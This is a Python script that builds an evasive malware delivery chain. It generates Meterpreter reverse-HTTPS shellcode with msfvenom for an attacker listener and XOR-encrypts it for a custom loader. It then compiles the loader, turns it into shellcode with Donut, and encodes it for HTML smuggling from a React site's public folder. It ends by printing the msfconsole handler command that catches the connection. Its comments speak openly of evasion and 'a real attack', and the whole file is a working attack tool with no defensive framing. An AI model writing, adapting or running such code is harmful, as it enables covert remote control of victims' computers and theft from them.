#!/usr/bin/env python3
import os
import subprocess
import sys
import base64

# --- Configuration (CHANGE THESE!) ---
LHOST = "192.168.1.100"    # Your IP address
LPORT = "4444"              # Your listener port
PAYLOAD_TYPE = "windows/x64/meterpreter/reverse_https"  # The payload you want
XOR_KEY = 0xAB             # Key for XOR encryption (must match loader.cpp)
# ------------------------------------

def run_command(cmd):
    """Run a shell command and print output."""
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Error: {result.stderr}")
        sys.exit(1)
    return result.stdout

def main():
    print("[*] Starting payload generation process...")

    # Step 1: Generate raw shellcode with msfvenom
    print("[*] Generating raw shellcode...")
    run_command(f"msfvenom -p {PAYLOAD_TYPE} LHOST={LHOST} LPORT={LPORT} -f raw -o shellcode.bin")

    # Step 2: Read and encrypt the shellcode with simple XOR
    print("[*] Encrypting shellcode for the loader...")
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()
    
    encrypted_shellcode = bytearray()
    for byte in shellcode:
        encrypted_shellcode.append(byte ^ XOR_KEY)
    
    # Write the encrypted shellcode to a file
    with open("encrypted_shellcode.enc", "wb") as f:
        f.write(encrypted_shellcode)
    
    # Step 3: Convert the encrypted shellcode to a C array for embedding
    with open("encrypted_shellcode.enc", "rb") as f:
        enc_data = f.read()
    hex_array = ", ".join([hex(b) for b in enc_data])
    with open("encrypted_shellcode.h", "w") as f:
        f.write(f"#ifndef ENCRYPTED_SHELLCODE_H\n#define ENCRYPTED_SHELLCODE_H\n\n")
        f.write(f"unsigned char encryptedShellcode[] = {{{hex_array}}};\n")
        f.write(f"unsigned int shellcode_len = {len(enc_data)};\n\n")
        f.write(f"#endif\n")
    
    # Step 4: Compile the custom loader with API Hashing (using MinGW/GCC)
    print("[*] Compiling XOR loader with API Hashing...")
    # Note: You need to have MinGW-w64 installed and in your PATH
    # The -O2 flag optimizes and reduces size, -s strips symbols
    compile_cmd = f"x86_64-w64-mingw32-g++ -O2 -s xor_loader.cpp -o xor_loader.exe -static"
    run_command(compile_cmd)
    
    # Step 5: Convert the compiled loader to shellcode using Donut
    print("[*] Converting loader to shellcode with Donut...")
    # Donut creates position-independent shellcode from an EXE[reference:1]
    run_command(f"donut -i xor_loader.exe -o loader_stage.bin -a 2 -f 1")
    # -a 2: x64 architecture, -f 1: output raw shellcode
    
    # Step 6: Encrypt the loader shellcode (another layer of evasion)
    print("[*] Encrypting loader shellcode for HTML smuggling...")
    with open("loader_stage.bin", "rb") as f:
        loader_shellcode = f.read()
    
    encrypted_loader = bytearray()
    for byte in loader_shellcode:
        encrypted_loader.append(byte ^ XOR_KEY)
    
    # Base64 encode for easy embedding in JavaScript
    b64_loader = base64.b64encode(encrypted_loader).decode()
    
    # Step 7: Write the final files to the React app's public folder
    print("[*] Writing final files to React public folder...")
    os.makedirs("../frontend/public/payloads", exist_ok=True)
    with open("../frontend/public/payloads/loader_stage.bin", "w") as f:
        f.write(b64_loader)
    
    # Also copy the encrypted shellcode for the loader to use (though it's embedded, this is for reference)
    # For a real attack, the encrypted shellcode is embedded directly in the loader's code.
    
    print("[+] Done! Files are ready in the frontend/public/payloads/ folder.")
    print("[+] Upload the entire 'frontend' folder to your web server.")
    print(f"[+] Don't forget to start your listener: msfconsole -q -x 'use multi/handler; set PAYLOAD {PAYLOAD_TYPE}; set LHOST {LHOST}; set LPORT {LPORT}; exploit'")

if __name__ == "__main__":
    main()